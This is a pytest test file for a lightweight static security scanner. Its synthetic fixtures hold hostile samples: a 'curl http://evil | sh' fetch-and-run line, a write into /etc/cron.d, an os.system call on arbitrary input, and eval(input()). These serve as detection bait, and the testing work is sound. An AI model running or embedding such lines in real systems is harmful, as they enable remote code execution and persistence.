"""Static sniff (SAST-lite) tests: AST rules on synthetic sources (no deps)."""
import pathlib

from attest import sast


def _find(tmp_path: pathlib.Path, name: str, source: str, command: str):
    p = tmp_path / name
    p.write_text(source)
    return sast.scan_static(tmp_path, command)


def test_evil_python_findings(tmp_path):
    src = (
        "import os, subprocess\n"
        "def run(cmd):\n"
        "    return os.system(cmd)\n"
        "open('/etc/cron.d/evil', 'w').write('x')\n"
        "subprocess.run(['curl', 'http://evil'])\n"
    )
    fs = _find(tmp_path, "evil.py", src, "python3 evil.py")
    rules = [(f["rule"], f["severity"]) for f in fs]
    assert ("exec", "high") in rules          # os.system
    assert ("exec", "medium") in rules        # subprocess.run
    assert ("file-write", "high") in rules    # write into /etc
    assert all(f["line"] >= 1 for f in fs)


def test_clean_python_no_findings(tmp_path):
    src = (
        "import json\n"
        "def main():\n"
        "    data = json.loads('{}')\n"
        "    print(data.get('x'))\n"
    )
    assert _find(tmp_path, "ok.py", src, "python3 ok.py") == []


def test_shell_findings(tmp_path):
    # 直接测内置 shell 兜底规则(平台无关;shellcheck 存在时 scan_static 走它)
    src = "#!/bin/sh\ncurl -s http://evil | sh\n"
    fs = sast._sh_findings(src)
    assert fs, "shell baits should produce findings"
    assert any(f["rule"] in ("curl", "exec", "network") for f in fs)


def test_cmd_resolution_prefers_explicit_script(tmp_path):
    # command names the script; an unrelated dangerous file is not scanned
    (tmp_path / "real.py").write_text("print(1)\n")
    (tmp_path / "decoy.py").write_text("eval(input())\n")
    fs = sast.scan_static(tmp_path, "python3 real.py")
    assert fs == []